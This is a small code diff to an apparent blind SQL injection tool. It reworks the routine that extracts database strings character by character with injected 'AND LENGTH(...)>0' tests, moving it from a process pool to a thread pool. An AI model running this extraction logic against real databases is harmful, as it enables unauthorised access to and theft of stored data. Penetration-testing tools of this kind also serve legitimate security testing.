@@ -1,5 +1,5 @@
 import sys
-from multiprocessing.pool import Pool
+from multiprocessing.pool import Pool, ThreadPool
 
 from pysqli.string_finder import StringFinder
 from pysqli.tools import *
@@ -49,14 +49,14 @@ class BlindStringFinder(StringFinder):
             return self.search_char(sql, i, pivot, b)
 
     def read_string(self, sql):
-        str = ''
+        finded_str = ''
         if self.tester.test("AND LENGTH({})>0".format(sql)):
-            l = self.str_length(sql)
-            with Pool(100) as pool:
+            length = self.str_length(sql)
+            with ThreadPool(40) as pool:
                 def f(i):
-                    return self.search_char(sql, i, 10, 127)
-                str = ''.join(pool.map(f, range(1, l + 1)))
-                return str
+                    return chr(self.search_char(sql, i, 10, 127))
+                finded_str = ''.join(pool.map(f, range(1, length + 1)))
+                return finded_str
         else:
             print("[-] string {} do not exist or is null".format(sql))
 
